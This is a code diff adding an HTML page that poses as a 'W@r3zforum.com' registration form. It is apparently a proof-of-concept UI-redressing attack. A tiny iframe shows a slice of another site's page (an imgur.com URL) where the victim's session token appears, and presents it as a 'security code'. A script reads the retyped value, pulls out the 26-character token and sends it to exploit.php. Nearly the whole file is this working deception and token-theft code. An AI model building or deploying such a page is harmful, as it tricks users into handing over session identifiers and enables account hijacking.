@@ -1,0 +1,139 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
+
+<style>
+
+#register {
+    width: 400px;
+    padding: 10px;
+    margin: 10px;
+    border: 1px dashed blue;
+}
+p {
+    margin: 0.1em;
+}
+
+iframe#one {
+    margin: 0;
+    padding: 0;
+/*  
+    overflow: hidden;
+*/
+    width: 9.1em;
+    height: 1em;
+    display: inline-block;
+    border: 2px inset black;
+    font: normal 13px/14px monospace;    
+}
+
+input {
+    margin: 10px 0;
+    padding: 0;
+    font-size: 1em;
+    width: 9.1em;
+    height: 1em;    
+    display: inline-block;
+    border: 2px inset black;    
+    font: normal 13px/14px monospace;            
+}
+
+#dwa {
+    display: none;
+    border: none;
+    width: 100%;
+    height: 300px;
+}
+
+label {
+    display: inline-block;
+    width: 200px;
+}
+
+sup {
+color: red;
+}
+
+</style>
+</head>
+<body>
+<h1>Congratulations, you're lucky - we have an account for you!</h1>
+<h2>Register to W@r3zforum.com</h2>
+<div id=register>
+<p><label>Name:<sup>*</sup></label><input /></p>
+<p><label>E-mail:<sup>*</sup></label><input /></p>
+<p><label>Password:<sup>*</sup></label><input type=password/></p>
+<p><label>Repeat password:<sup>*</sup></label><input type=password /></p>
+<p><small>To protect our forum against spam, please retype the below security code:</small></p>
+<p><label>Security code:</label><iframe id=one scrolling=no></iframe></p>
+<p><label>Repeat security code<sup>*</sup>: </label><input id=a value="" style="color:#999" autocomplete="off"></p>
+<p><label></label><button type=button>Register</button></p>
+<p><sup>*</sup> required</p>
+</div>
+<script>
+$(function() {
+
+  String.prototype.width = function(font) {
+	  var o = $('<pre>' + this + '</pre>')
+	            .css({'position': 'absolute', 'float': 'left', 'visibility': 'hidden'})
+	            .appendTo($('body')),
+	      w = o.width();
+
+	  o.remove();
+
+	  return w;
+	}
+
+  String.prototype.height = function(font) {
+      var o = $('<pre>' + this + '</pre>').css({
+          'position' : 'absolute',
+          'float' : 'left',
+          'visibility' : 'hidden'
+      }).appendTo($('body')), w = o.height();
+
+      o.remove();
+
+      return w;
+  }
+
+  // measure char width
+  var char_width = '1234567890'.width() / 10;
+  
+  $('#one,#a').width(16 * char_width);
+  //$('#one').width(16 * char_width);
+  
+  var line_height = '1\n2\n3\n4\n5\n6\n7\n8\n9\n0'.height() / 10;
+  
+  var line = 1;
+  var col = 1325; // 1448; // 1326
+  var url = 'http://imgur.com/?flash&_=' + Math.random();
+  var src = 'outer.html?' + Math.random() + '#' + char_width + ":"
+  + line_height + ':' + line + ":" + col + ':' + url;
+  
+  $('#one').attr('src', src);
+  
+  var inte;
+	
+  var capture = function() {
+      var a, t = document.getElementById('a');
+      
+      if (!t.value || t.value.match('^\s*$'))
+    	  return;
+      
+      if (a = t.value.match(/value=\"([a-zA-Z0-9]{26})/)) {
+    	  $("#dwa").show().attr('src','exploit.php?sid=' + a[1]);
+          $("<h2>OK, processing...</h2>").insertAfter('#register');
+          $('#register').remove();
+          clearInterval(inte);
+      }
+  };
+  
+  inte = setInterval(capture, 10);
+  //$('#a').keyup(capture).blur(capture).keydown(capture).val('');
+})
+</script>
+<iframe id=dwa>loading...</iframe>
+</body>
+</html>
